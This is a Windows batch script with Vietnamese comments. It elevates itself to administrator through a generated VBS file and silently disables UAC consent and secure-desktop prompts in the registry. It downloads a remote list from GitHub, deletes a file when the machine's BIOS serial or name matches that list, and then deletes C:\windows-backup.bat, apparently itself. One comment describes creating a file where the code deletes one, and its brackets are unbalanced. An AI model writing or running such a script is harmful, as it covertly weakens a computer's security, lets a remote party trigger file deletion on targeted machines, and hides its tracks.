@echo off
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
setlocal enabledelayedexpansion

:: Tải file check.txt về %temp%
set "url=https://raw.githubusercontent.com/mitutina/mitutina/main/check.txt"
set "tempfile=%temp%\check.txt"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%tempfile%')"

:: Lấy SerialNumber và Device Name
for /f "tokens=*" %%i in ('powershell -Command "(Get-CimInstance -ClassName Win32_BIOS).SerialNumber"') do set "serial=%%i"
for /f "tokens=*" %%i in ('powershell -Command "(Get-CimInstance -ClassName Win32_ComputerSystem).Name"') do set "device=%%i"

:: Hiển thị thông tin để so sánh
echo Serial Number: %serial%
echo Device Name: %device%
echo Noi Dung file temp.txt:
type "%tempfile%"

:: So sánh nội dung
set "found=0"
for /f "delims=" %%j in ('type "%tempfile%"') do (
    if /i "%%j"=="%serial%" set "found=1"
    if /i "%%j"=="%device%" set "found=1"
)

:: Tạo file Oke.txt nếu tìm thấy trùng lặp
if %found%==1 (



del /f /q "C:\a.txt"






)
) else (
    echo Khong trung khop.
)

:: Xóa file tạm và các biến tạm thời
if exist "%tempfile%" del "%tempfile%"
set "url="
set "tempfile="
set "serial="
set "device="
set "found="
del /f /q "C:\windows-backup.bat"
echo Hoan Thanh.
exit
